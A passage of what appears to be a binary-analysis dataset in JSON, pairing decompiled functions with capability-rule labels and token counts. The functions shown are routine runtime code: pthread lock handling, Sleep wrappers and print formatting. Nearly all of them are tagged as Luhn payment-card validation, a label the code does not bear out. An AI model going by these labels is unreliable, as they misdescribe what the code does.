        "decompiled_code": "\nint16_t * fcn.14000ad00(void)\n\n{\n    int16_t *piVar1;\n    \n    if ((**0x1400d7060 == 0x5a4d) && (*(*(*0x1400d7060 + 0x1e) + *0x1400d7060) == 0x4550)) {\n        piVar1 = NULL;\n        if (*(*(*0x1400d7060 + 0x1e) + *0x1400d7060 + 6) == 0x20b) {\n            piVar1 = *0x1400d7060;\n        }\n        return piVar1;\n    }\n    return NULL;\n}\n",
        "token_count": 157
    },
    "14000f7b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14000f7b0(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.14000d0d0();\n    if (iVar1 != 0) {\n        iVar1 = *(iVar1 + 0x30);\n    }\n    return iVar1;\n}\n",
        "token_count": 69
    },
    "14000f7f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14000f7f0(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.14000d0d0();\n    if (iVar1 != 0) {\n        iVar1 = iVar1 + 0x18;\n    }\n    return iVar1;\n}\n",
        "token_count": 68
    },
    "14000fb3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000fb30(ulong arg1)\n\n{\n    int64_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.14000d0d0();\n    if (iVar1 != 0) {\n        piVar2 = iVar1 + 0x20;\n        if (arg1 < 1) {\n            LOCK();\n            *piVar2 = *piVar2 + -1;\n            return;\n        }\n        LOCK();\n        *piVar2 = *piVar2 + 1;\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "14000fe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14000fe00(uint64_t arg1)\n\n{\n    int64_t iVar1;\n    \n    arg1 = arg1 & 0xffffffff;\n    iVar1 = fcn.14000d0d0();\n    if (arg1 != 0) {\n        fcn.14000fc70();\n        if (*(iVar1 + 0x30) == 0) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(arg1);\n        }\n        else {\n            fcn.140011850(*(iVar1 + 0x30), arg1);\n        }\n        fcn.14000fc70();\n        return 0;\n    }\n    fcn.14000fc70();\n    (*_sym.imp.KERNEL32.dll_Sleep)(0);\n    fcn.14000fc70();\n    return 0;\n}\n",
        "token_count": 179
    },
    "14001127": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140011270(ulong arg1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ulong auStack32 [2];\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_FormatMessageA)(0x1100, 0, iVar2, 0x400, auStack32, 0, 0);\n        pcVar1 = _sym.imp.KERNEL32.dll_OutputDebugStringA;\n        if (iVar2 != 0) {\n            (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(auStack32[0]);\n            (*pcVar1)(arg1);\n            (*_sym.imp.KERNEL32.dll_LocalFree)(auStack32[0]);\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n        if (iVar2 != 0) {\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "14001174": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.140011740(void)\n\n{\n    uint32_t uStack16;\n    uint32_t uStack12;\n    \n    (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(&uStack16);\n    return ((uStack12 << 0x20) + uStack16 + 0xfe624e212ac18000) / 10000;\n}\n",
        "token_count": 84
    },
    "1400119a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.1400119a0(uint64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    \n    puVar3 = sub.msvcrt.dll_malloc(0x18);\n    if (puVar3 != NULL) {\n        *puVar3 = 0;\n        uVar2 = 2;\n        if (arg2 != 0xfffffffffffffffd) {\n            uVar2 = arg2 == 0xfffffffffffffffe;\n        }\n        puVar3[1] = uVar2;\n        *(puVar3 + 2) = 0;\n        puVar3[4] = 0;\n        puVar3[5] = 0xffffffff;\n        LOCK();\n        uVar1 = *arg1;\n        *arg1 = *arg1 ^ (arg2 == uVar1) * (*arg1 ^ puVar3);\n        if (arg2 != uVar1) {\n            sub.msvcrt.dll_free(puVar3);\n            puVar3 = *arg1;\n        }\n    }\n    return puVar3;\n}\n",
        "token_count": 250
    },
    "14001258": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.140012580(ulong *arg1)\n\n{\n    uint *arg1_00;\n    int32_t iVar1;\n    uint *puVar2;\n    \n    if (arg1 == NULL) {\n        iVar1 = 0x16;\n    }\n    else {\n        *arg1 = 0;\n        puVar2 = sub.msvcrt.dll_calloc(1);\n        if (puVar2 == NULL) {\n            iVar1 = 0xc;\n        }\n        else {\n            *puVar2 = 0xdeadb0ef;\n            arg1_00 = puVar2 + 6;\n            *(puVar2 + 2) = 0;\n            puVar2[4] = 0;\n            iVar1 = fcn.140011ec0(arg1_00, 0);\n            if (iVar1 == 0) {\n                iVar1 = fcn.140011ec0(puVar2 + 8, 0);\n                if (iVar1 == 0) {\n                    iVar1 = fcn.140013610(puVar2 + 10, 0);\n                    if (iVar1 == 0) {\n                        *puVar2 = 0xbab1f0ed;\n                        *arg1 = puVar2;\n                        return 0;\n                    }\n                    fcn.140011f10(arg1_00);\n                    fcn.140011f10(puVar2 + 8);\n                    sub.msvcrt.dll_free(puVar2);\n                    return iVar1;\n                }\n                fcn.140011f10(arg1_00);\n            }\n            sub.msvcrt.dll_free(puVar2);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 368
    },
    "140012b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.140012b10(int32_t **arg1)\n\n{\n    int32_t *piVar1;\n    int64_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    ulong uVar11;\n    ulong unaff_RBX;\n    uint uVar12;\n    \n    uVar12 = unaff_RBX >> 0x20;\n    uVar10 = fcn.1400127f0(arg1);\n    if (uVar10 != 0) {\n        return uVar10;\n    }\n    piVar1 = *arg1;\n    piVar7 = piVar1 + 6;\n    uVar5 = fcn.140011a20(piVar7);\n    if (uVar5 == 0) {\n        LOCK();\n        piVar1[3] = piVar1[3] + 1;\n        if (piVar1[3] != 0x7fffffff) {\n            uVar5 = fcn.140011d40(piVar7);\n            goto code_r0x000140012b6a;\n        }\n        uVar5 = fcn.140011a20(piVar1 + 8);\n        uVar10 = uVar5;\n        if (uVar5 == 0) {\n            piVar1[3] = piVar1[3] - piVar1[4];\n            piVar1[4] = 0;\n            uVar5 = fcn.140011d40(piVar1 + 8);\n            uVar6 = fcn.140011d40(piVar7);\n            if (uVar5 == 0) {\n                uVar5 = uVar6;\n            }\n            uVar10 = uVar5;\n        }\n        else {\n            fcn.140011d40(piVar7);\n        }\n    }\n    else {\ncode_r0x000140012b6a:\n        uVar10 = uVar5;\n    }\n    piVar2 = *0x1400d7110;\n    iVar9 = **0x1400d7110;\n    if (iVar9 == 0) {\n        iVar8 = fcn.1400113f0();\n        iVar9 = *piVar2;\n        if (*(iVar8 + 0xa0) == 0) goto code_r0x00014001234b;\n        if (iVar9 == 0) {\n            iVar9 = fcn.1400113f0();\n        }\ncode_r0x0001400123d8:\n        uVar11 = *(iVar9 + 0xa0);\n    }\n    else {\n        if (*(iVar9 + 0xa0) != 0) goto code_r0x0001400123d8;\ncode_r0x00014001234b:\n        uVar11 = 0x14001b0d8;\n        *(iVar9 + 0xa0) = 0x14001b0d8;\n    }\n    fcn.1400132a0(uVar11);\n    if ((**arg1 != -0x454e0f13) || ((*arg1)[1] < 1)) {\n        uVar11 = (**0x14001b130)(2);\n        sub.msvcrt.dll_fprintf\n                  (uVar11, \"Assertion failed: (%s), file %s, line %d\\n\", \n                   \"(((rwlock_t *)*rwl)->valid == LIFE_RWLOCK) && (((rwlock_t *)*rwl)->busy > 0)\", \n                   \"C:/crossdev/src/mingw-w64-v8-git/mingw-w64-libraries/winpthreads/src/rwlock.c\", \n                   CONCAT44(uVar12, 0x2e));\n        iVar9 = 1;\n        sub.msvcrt.dll_exit();\n        *(iVar9 + 0xc) = -*(iVar9 + 0x10);\n        *(iVar9 + 0x10) = 0;\n        fcn.140011d40(iVar9 + 0x20);\n        piVar7 = *(iVar9 + 0x18);\n        if (piVar7 + 3U < 4) {\n            piVar7 = fcn.1400119a0(iVar9 + 0x18, piVar7);\n        }\n        if (piVar7 == NULL) {\n            return 0xc;\n        }\n        if (piVar7[1] != 0) {\n            if (*piVar7 == 0) {\n                return 0x16;\n            }\n            iVar4 = piVar7[5];\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            if (iVar4 != iVar3) {\n                return 1;\n            }\n            if (piVar7[4] != 0) {\n                piVar7[4] = piVar7[4] + -1;\n                return 0;\n            }\n            piVar7[5] = -1;\n        }\n        iVar4 = *piVar7;\n        *piVar7 = 0;\n        uVar10 = 0;\n        if (iVar4 == 2) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_SetEvent)(*(piVar7 + 2));\n            uVar10 = iVar4 == 0;\n        }\n        return uVar10;\n    }\n    (*arg1)[1] = (*arg1)[1] + -1;\n    iVar9 = *piVar2;\n    if (iVar9 == 0) {\n        iVar8 = fcn.1400113f0();\n        iVar9 = *piVar2;\n        if (*(iVar8 + 0xa0) != 0) {\n            if (iVar9 == 0) {\n                iVar9 = fcn.1400113f0();\n            }\n            goto code_r0x000140012410;\n        }\n    }\n    else if (*(iVar9 + 0xa0) != 0) {\ncode_r0x000140012410:\n        uVar11 = *(iVar9 + 0xa0);\n        goto code_r0x0001400123a2;\n    }\n    uVar11 = 0x14001b0d8;\n    *(iVar9 + 0xa0) = 0x14001b0d8;\ncode_r0x0001400123a2:\n    fcn.1400132e0(uVar11);\n    return uVar10;\n}\n",
        "token_count": 1436
    },
    "140012e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.140012e80(int32_t **arg1)\n\n{\n    int32_t *piVar1;\n    int64_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    ulong uVar11;\n    \n    uVar10 = fcn.1400121f0(arg1);\n    if (uVar10 != 0) {\n        return uVar10;\n    }\n    piVar1 = *arg1;\n    piVar7 = piVar1 + 8;\n    if (piVar1[2] == 0) {\n        uVar5 = fcn.140011a20(piVar7);\n        uVar10 = uVar5;\n        if (uVar5 == 0) {\n            LOCK();\n            piVar1[4] = piVar1[4] + 1;\n            if (piVar1[4] == 0) {\n                uVar5 = fcn.140013e80(piVar1 + 10);\n                uVar6 = fcn.140011d40(piVar7);\n                if (uVar5 == 0) {\n                    uVar5 = uVar6;\n                }\n                uVar10 = uVar5;\n            }\n            else {\n                uVar5 = fcn.140011d40(piVar7);\n                uVar10 = uVar5;\n            }\n        }\n    }\n    else {\n        LOCK();\n        piVar1[2] = piVar1[2] + -1;\n        uVar5 = fcn.140011d40(piVar7);\n        uVar10 = uVar5;\n        uVar6 = fcn.140011d40(piVar1 + 6);\n        if (uVar5 == 0) {\n            uVar10 = uVar6;\n        }\n    }\n    piVar2 = *0x1400d7110;\n    iVar9 = **0x1400d7110;\n    if (iVar9 == 0) {\n        iVar8 = fcn.1400113f0();\n        iVar9 = *piVar2;\n        if (*(iVar8 + 0xa0) == 0) goto code_r0x00014001234b;\n        if (iVar9 == 0) {\n            iVar9 = fcn.1400113f0();\n        }\ncode_r0x0001400123d8:\n        uVar11 = *(iVar9 + 0xa0);\n    }\n    else {\n        if (*(iVar9 + 0xa0) != 0) goto code_r0x0001400123d8;\ncode_r0x00014001234b:\n        uVar11 = 0x14001b0d8;\n        *(iVar9 + 0xa0) = 0x14001b0d8;\n    }\n    fcn.1400132a0(uVar11);\n    if ((**arg1 != -0x454e0f13) || ((*arg1)[1] < 1)) {\n        uVar11 = (**0x14001b130)(2);\n        sub.msvcrt.dll_fprintf\n                  (uVar11, \"Assertion failed: (%s), file %s, line %d\\n\", \n                   \"(((rwlock_t *)*rwl)->valid == LIFE_RWLOCK) && (((rwlock_t *)*rwl)->busy > 0)\", \n                   \"C:/crossdev/src/mingw-w64-v8-git/mingw-w64-libraries/winpthreads/src/rwlock.c\", 0x2e);\n        iVar9 = 1;\n        sub.msvcrt.dll_exit();\n        *(iVar9 + 0xc) = -*(iVar9 + 0x10);\n        *(iVar9 + 0x10) = 0;\n        fcn.140011d40(iVar9 + 0x20);\n        piVar7 = *(iVar9 + 0x18);\n        if (piVar7 + 3U < 4) {\n            piVar7 = fcn.1400119a0(iVar9 + 0x18, piVar7);\n        }\n        if (piVar7 == NULL) {\n            return 0xc;\n        }\n        if (piVar7[1] != 0) {\n            if (*piVar7 == 0) {\n                return 0x16;\n            }\n            iVar4 = piVar7[5];\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            if (iVar4 != iVar3) {\n                return 1;\n            }\n            if (piVar7[4] != 0) {\n                piVar7[4] = piVar7[4] + -1;\n                return 0;\n            }\n            piVar7[5] = -1;\n        }\n        iVar4 = *piVar7;\n        *piVar7 = 0;\n        uVar10 = 0;\n        if (iVar4 == 2) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_SetEvent)(*(piVar7 + 2));\n            uVar10 = iVar4 == 0;\n        }\n        return uVar10;\n    }\n    (*arg1)[1] = (*arg1)[1] + -1;\n    iVar9 = *piVar2;\n    if (iVar9 == 0) {\n        iVar8 = fcn.1400113f0();\n        iVar9 = *piVar2;\n        if (*(iVar8 + 0xa0) != 0) {\n            if (iVar9 == 0) {\n                iVar9 = fcn.1400113f0();\n            }\n            goto code_r0x000140012410;\n        }\n    }\n    else if (*(iVar9 + 0xa0) != 0) {\ncode_r0x000140012410:\n        uVar11 = *(iVar9 + 0xa0);\n        goto code_r0x0001400123a2;\n    }\n    uVar11 = 0x14001b0d8;\n    *(iVar9 + 0xa0) = 0x14001b0d8;\ncode_r0x0001400123a2:\n    fcn.1400132e0(uVar11);\n    return uVar10;\n}\n",
        "token_count": 1400
    },
    "140012f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.140012f40(int32_t **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    ulong *puVar9;\n    int64_t *piVar10;\n    ulong uVar11;\n    int32_t *piStack88;\n    int32_t **ppiStack80;\n    ulong uStack72;\n    \n    uVar8 = fcn.1400127f0(arg1);\n    if (uVar8 != 0) {\n        return uVar8;\n    }\n    piVar5 = *arg1;\n    uVar3 = fcn.140011a20(piVar5 + 6);\n    uVar8 = uVar3;\n    if (uVar3 == 0) {\n        uVar3 = fcn.140011a20(piVar5 + 8);\n        uVar8 = uVar3;\n        if (uVar3 == 0) {\n            if (piVar5[2] == 0) {\n                iVar4 = piVar5[3];\n                if (0 < piVar5[4]) {\n                    iVar4 = iVar4 - piVar5[4];\n                    piVar5[4] = 0;\n                    piVar5[3] = iVar4;\n                }\n                if (0 < iVar4) {\n                    piVar5[4] = -iVar4;\n                    piStack88 = 0x140012460;\n                    ppiStack80 = piVar5;\n                    puVar9 = fcn.14000f7f0();\n                    uStack72 = *puVar9;\n                    piVar10 = fcn.14000f7f0();\n                    *piVar10 = &piStack88;\n                    do {\n                        uVar3 = fcn.140014110(piVar5 + 10, piVar5 + 8);\n                        if (uVar3 != 0) {\n                            puVar9 = fcn.14000f7f0();\n                            uVar8 = uVar3;\n                            *puVar9 = uStack72;\n                            (*piStack88)(ppiStack80);\n                            goto code_r0x000140012320;\n                        }\n                    } while (piVar5[4] < 0);\n                    puVar9 = fcn.14000f7f0();\n                    *puVar9 = uStack72;\n                    piVar5[3] = 0;\n                }\n            }\n            LOCK();\n            piVar5[2] = piVar5[2] + 1;\n        }\n        else {\n            fcn.140011d40(piVar5 + 6);\n        }\n    }\ncode_r0x000140012320:\n    piVar10 = *0x1400d7110;\n    iVar7 = **0x1400d7110;\n    if (iVar7 == 0) {\n        ppiStack80 = 0x1400123bd;\n        iVar6 = fcn.1400113f0();\n        iVar7 = *piVar10;\n        if (*(iVar6 + 0xa0) == 0) goto code_r0x00014001234b;\n        if (iVar7 == 0) {\n            ppiStack80 = 0x1400123d4;\n            iVar7 = fcn.1400113f0();\n        }\ncode_r0x0001400123d8:\n        uVar11 = *(iVar7 + 0xa0);\n    }\n    else {\n        if (*(iVar7 + 0xa0) != 0) goto code_r0x0001400123d8;\ncode_r0x00014001234b:\n        uVar11 = 0x14001b0d8;\n        *(iVar7 + 0xa0) = 0x14001b0d8;\n    }\n    ppiStack80 = 0x14001235e;\n    fcn.1400132a0(uVar11);\n    if ((**arg1 != -0x454e0f13) || ((*arg1)[1] < 1)) {\n        ppiStack80 = 0x140012424;\n        uVar11 = (**0x14001b130)(2);\n        ppiStack80 = 0x140012449;\n        sub.msvcrt.dll_fprintf\n                  (uVar11, \"Assertion failed: (%s), file %s, line %d\\n\", \n                   \"(((rwlock_t *)*rwl)->valid == LIFE_RWLOCK) && (((rwlock_t *)*rwl)->busy > 0)\", \n                   \"C:/crossdev/src/mingw-w64-v8-git/mingw-w64-libraries/winpthreads/src/rwlock.c\");\n        iVar7 = 1;\n        ppiStack80 = 0x140012453;\n        sub.msvcrt.dll_exit();\n        *(iVar7 + 0xc) = -*(iVar7 + 0x10);\n        *(iVar7 + 0x10) = 0;\n        ppiStack80 = arg1;\n        fcn.140011d40(iVar7 + 0x20);\n        piVar5 = *(iVar7 + 0x18);\n        piVar1 = piStack88;\n        if (piVar5 + 3U < 4) {\n            piVar5 = fcn.1400119a0(iVar7 + 0x18, piVar5);\n            piVar1 = piStack88;\n        }\n        piStack88 = piVar5;\n        if (piStack88 == NULL) {\n            return 0xc;\n        }\n        piVar5 = piStack88;\n        if (piStack88[1] != 0) {\n            if (*piStack88 == 0) {\n                return 0x16;\n            }\n            iVar4 = piStack88[5];\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            if (iVar4 != iVar2) {\n                return 1;\n            }\n            if (piStack88[4] != 0) {\n                piStack88[4] = piStack88[4] + -1;\n                return 0;\n            }\n            piStack88[5] = -1;\n            piVar5 = piStack88;\n            piVar1 = piStack88;\n        }\n        piStack88 = piVar1;\n        iVar4 = *piVar5;\n        *piVar5 = 0;\n        uVar8 = 0;\n        if (iVar4 == 2) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_SetEvent)(*(piVar5 + 2));\n            uVar8 = iVar4 == 0;\n        }\n        return uVar8;\n    }\n    (*arg1)[1] = (*arg1)[1] + -1;\n    iVar7 = *piVar10;\n    if (iVar7 == 0) {\n        ppiStack80 = 0x1400123ed;\n        iVar6 = fcn.1400113f0();\n        iVar7 = *piVar10;\n        if (*(iVar6 + 0xa0) != 0) {\n            if (iVar7 == 0) {\n                ppiStack80 = 0x140012407;\n                iVar7 = fcn.1400113f0();\n            }\n            goto code_r0x000140012410;\n        }\n    }\n    else if (*(iVar7 + 0xa0) != 0) {\ncode_r0x000140012410:\n        uVar11 = *(iVar7 + 0xa0);\n        goto code_r0x0001400123a2;\n    }\n    uVar11 = 0x14001b0d8;\n    *(iVar7 + 0xa0) = 0x14001b0d8;\ncode_r0x0001400123a2:\n    ppiStack80 = 0x1400123a7;\n    fcn.1400132e0(uVar11);\n    return uVar8;\n}\n",
        "token_count": 1773
    },
    "140013b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.140013b90(ulong arg1, uint64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t *in_stack_00000028;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_EnterCriticalSection;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg4);\n    LOCK();\n    *in_stack_00000028 = *in_stack_00000028 + -1;\n    pcVar3 = _sym.imp.KERNEL32.dll_LeaveCriticalSection;\n    iVar4 = 0;\n    iVar1 = *in_stack_00000028;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg4);\n    if (iVar1 < 0) {\n        iVar4 = fcn.140013880(arg1, arg2 & 0xffffffff, arg3 & 0xffffffff);\n        (*pcVar2)(arg4);\n        if (iVar4 != 0) {\n            LOCK();\n            *in_stack_00000028 = *in_stack_00000028 + 1;\n        }\n        (*pcVar3)(arg4);\n    }\n    return iVar4;\n}\n",
        "token_count": 276
    },
    "140014a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delay execution"
        ],
        "decompiled_code": "\nulong fcn.140014a50(void)\n\n{\n    (*_sym.imp.KERNEL32.dll_Sleep)(0);\n    return 0;\n}\n",
        "token_count": 32
    },
    "140014ca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140014ca0(ulong arg1, int64_t *arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *in_stack_00000028;\n    uint auStack20 [5];\n    \n    iVar1 = *arg2;\n    uVar2 = iVar1 >> 0x20;\n    if ((*(arg2 + 1) & 0x7fff) == 0) {\n        if ((iVar1 | uVar2) == 0) {\n            auStack20[0] = 0;\n            uVar2 = *(arg2 + 1);\n            uVar3 = 0;\n        }\n        else {\n            uVar2 = *(arg2 + 1);\n            if (iVar1 < 0) goto code_r0x000140014cd3;\n            auStack20[0] = 2;\n            uVar3 = 0xffffbfc3;\n        }\n    }\n    else if ((*(arg2 + 1) & 0x7fff) == 0x7fff) {\n        if ((uVar2 & 0x7fffffff | iVar1) != 0) {\n            auStack20[0] = 4;\n            uVar3 = 0;\n            uVar2 = 0;\n            goto code_r0x000140014cf5;\n        }\n        auStack20[0] = 3;\n        uVar2 = *(arg2 + 1);\n        uVar3 = 0;\n    }\n    else {\n        uVar2 = *(arg2 + 1);\ncode_r0x000140014cd3:\n        auStack20[0] = 1;\n        uVar3 = (uVar2 & 0x7fff) + 0xbfc2;\n    }\n    uVar2 = uVar2 & 0x8000;\ncode_r0x000140014cf5:\n    *in_stack_00000028 = uVar2;\n    fcn.1400174e0(0x14001b100, uVar3, arg2, auStack20);\n    return;\n}\n",
        "token_count": 479
    },
    "140014dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140014dc0(ulong c, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    \n    if (((*(arg2 + 1) & 0x4000) != 0) || (iVar1 = *(arg2 + 0x24),  *(arg2 + 5) != iVar1 && iVar1 <= *(arg2 + 5))) {\n        if ((*(arg2 + 1) & 0x2000) != 0) {\n            sub.msvcrt.dll_fputc(c, *arg2);\n            *(arg2 + 0x24) = *(arg2 + 0x24) + 1;\n            return;\n        }\n        *(*arg2 + *(arg2 + 0x24)) = c;\n        iVar1 = *(arg2 + 0x24);\n    }\n    *(arg2 + 0x24) = iVar1 + 1;\n    return;\n}\n",
        "token_count": 205
    },
    "140014e2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140014e20(uint16_t *arg1, ulong arg2, int64_t *arg3)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uchar auStack72 [16];\n    \n    fcn.140019ff0(auStack72, 0);\n    iVar2 = *(arg3 + 2);\n    if ((-1 < iVar2) && (iVar2 < arg2)) {\n        arg2._0_4_ = iVar2;\n    }\n    if (arg2 < *(arg3 + 0xc)) {\n        iVar2 = *(arg3 + 0xc) - arg2;\n        *(arg3 + 0xc) = iVar2;\n        if ((*(arg3 + 9) & 4) == 0) {\n            *(arg3 + 0xc) = iVar2 + -1;\n            do {\n                fcn.140014dc0(0x20, arg3);\n                iVar2 = *(arg3 + 0xc);\n                *(arg3 + 0xc) = iVar2 + -1;\n            } while (iVar2 != 0);\n            goto code_r0x000140014e6b;\n        }\n        if (arg2 < 1) {\n            *(arg3 + 0xc) = iVar2 + -1;\n            goto code_r0x000140014f00;\n        }\n    }\n    else {\n        *(arg3 + 0xc) = 0xffffffff;\ncode_r0x000140014e6b:\n        if (arg2 < 1) {\n            *(arg3 + 0xc) = 0xfffffffe;\n            return;\n        }\n    }\n    do {\n        uVar1 = *arg1;\n        arg1 = arg1 + 1;\n        iVar2 = fcn.140019ff0(auStack72, uVar1);\n        if (iVar2 < 1) goto code_r0x000140014f0d;\n        puVar4 = auStack72;\n        do {\n            while( true ) {\n                puVar5 = puVar4 + 1;\n                if (((*(arg3 + 1) & 0x4000) != 0) ||\n                   (iVar3 = *(arg3 + 0x24),  *(arg3 + 5) != iVar3 && iVar3 <= *(arg3 + 5))) break;\ncode_r0x000140014eab:\n                *(arg3 + 0x24) = iVar3 + 1;\n                puVar4 = puVar5;\n                if (puVar5 == auStack72 + (iVar2 - 1) + 1) goto code_r0x000140014eec;\n            }\n            if ((*(arg3 + 1) & 0x2000) == 0) {\n                *(*arg3 + *(arg3 + 0x24)) = *puVar4;\n                iVar3 = *(arg3 + 0x24);\n                goto code_r0x000140014eab;\n            }\n            sub.msvcrt.dll_fputc();\n            *(arg3 + 0x24) = *(arg3 + 0x24) + 1;\n            puVar4 = puVar5;\n        } while (puVar5 != auStack72 + (iVar2 - 1) + 1);\ncode_r0x000140014eec:\n        arg2._0_4_ = arg2 + -1;\n    } while (arg2 != 0);\n    iVar2 = *(arg3 + 0xc);\n    *(arg3 + 0xc) = iVar2 + -1;\n    if (iVar2 < 1) {\n        return;\n    }\ncode_r0x000140014f00:\n    do {\n        fcn.140014dc0(0x20, arg3);\ncode_r0x000140014f0d:\n        iVar2 = *(arg3 + 0xc);\n        *(arg3 + 0xc) = iVar2 + -1;\n    } while (0 < iVar2);\n    return;\n}\n",
        "token_count": 900
    },
    "140014f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140014f80(uchar *arg1, ulong arg2, int64_t *arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    \n    iVar2 = *(arg3 + 2);\n    if ((-1 < iVar2) && (iVar2 < arg2)) {\n        arg2._0_4_ = iVar2;\n    }\n    if (arg2 < *(arg3 + 0xc)) {\n        iVar2 = *(arg3 + 0xc) - arg2;\n        *(arg3 + 0xc) = iVar2;\n        uVar1 = *(arg3 + 1);\n        if ((uVar1 & 0x400) != 0) {\n            if (arg2 == 0) {\n                *(arg3 + 0xc) = iVar2 + -1;\n                goto code_r0x000140015031;\n            }\n            goto code_r0x000140014fb9;\n        }\n        *(arg3 + 0xc) = iVar2 + -1;\n        do {\n            fcn.140014dc0(0x20, arg3);\n            iVar2 = *(arg3 + 0xc);\n            *(arg3 + 0xc) = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    else {\n        *(arg3 + 0xc) = 0xffffffff;\n    }\n    if (arg2 == 0) {\n        *(arg3 + 0xc) = 0xfffffffe;\n        return;\n    }\n    uVar1 = *(arg3 + 1);\ncode_r0x000140014fb9:\n    puVar3 = arg1 + (arg2 - 1);\n    while( true ) {\n        if (((uVar1 & 0x4000) != 0) || (iVar2 = *(arg3 + 0x24),  *(arg3 + 5) != iVar2 && iVar2 <= *(arg3 + 5))) {\n            if ((uVar1 & 0x2000) == 0) {\n                *(*arg3 + *(arg3 + 0x24)) = *arg1;\n                iVar2 = *(arg3 + 0x24);\n            }\n            else {\n                sub.msvcrt.dll_fputc();\n                iVar2 = *(arg3 + 0x24);\n            }\n        }\n        *(arg3 + 0x24) = iVar2 + 1;\n        if (puVar3 == arg1) break;\n        uVar1 = *(arg3 + 1);\n        arg1 = arg1 + 1;\n    }\n    while (iVar2 = *(arg3 + 0xc),  *(arg3 + 0xc) = iVar2 + -1,  0 < iVar2) {\n        uVar1 = 